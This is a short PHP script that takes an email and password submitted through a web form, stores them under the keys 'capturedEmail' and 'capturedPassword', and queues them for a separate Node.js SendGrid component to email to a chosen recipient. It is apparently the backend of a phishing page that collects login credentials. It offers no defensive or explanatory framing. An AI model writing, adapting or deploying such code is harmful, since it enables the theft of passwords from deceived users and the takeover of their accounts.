<?php
// This file connects the PHP form with the Node.js SendGrid functionality

// Get the email and password from the POST request
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$recipient_email = "your-email@example.com"; // Change this to your actual email

// Save the data to a file for Node.js to process
$data = json_encode([
    'capturedEmail' => $email,
    'capturedPassword' => $password,
    'recipientEmail' => $recipient_email,
    'timestamp' => date('Y-m-d H:i:s')
]);

file_put_contents('email_queue.json', $data . PHP_EOL, FILE_APPEND);

// Return success message
echo json_encode([
    'status' => 'success',
    'message' => 'Data queued for email sending'
]);
?>